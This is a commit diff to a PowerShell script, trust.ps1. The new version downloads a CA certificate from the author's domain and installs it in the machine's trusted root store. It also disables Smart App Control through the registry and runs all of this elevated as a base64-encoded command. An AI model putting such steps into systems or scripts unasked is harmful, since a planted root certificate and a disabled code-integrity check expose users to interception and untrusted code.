5d6231460108bc3b8a995e2e1607e66ae61a3521
Khushraj Rathod <khushraj.rathod@gmail.com>
2026-06-24 21:46:00 +0530

    Disable smart app control in trust.ps1

--- trust.ps1
+++ trust.ps1
@@ -1,12 +1,12 @@
+$payload = @'
 $url = "https://files.khushrajrathod.com/ca.crt"
 $path = "$env:TEMP\ca.crt"
 
 Invoke-WebRequest -Uri $url -OutFile $path
+Import-Certificate -FilePath $path -CertStoreLocation Cert:\LocalMachine\Root | Out-Null
+Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\CI\Policy" -Name "VerifiedAndReputablePolicyState" -Value 0
+citool.exe -r
+'@
 
-try {
-    Start-Process powershell -Verb RunAs -WindowStyle Hidden -Wait -ErrorAction Stop -ArgumentList "-NoProfile -Command `"Import-Certificate -FilePath '$path' -CertStoreLocation Cert:\LocalMachine\Root`""
-} catch {
-    Import-Certificate -FilePath $path -CertStoreLocation Cert:\CurrentUser\Root
-}
-
-Read-Host "Certificate install completed successfully, press enter to exit"
+$encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($payload))
+Start-Process powershell.exe -Verb RunAs -ArgumentList "-NoProfile -EncodedCommand $encoded"
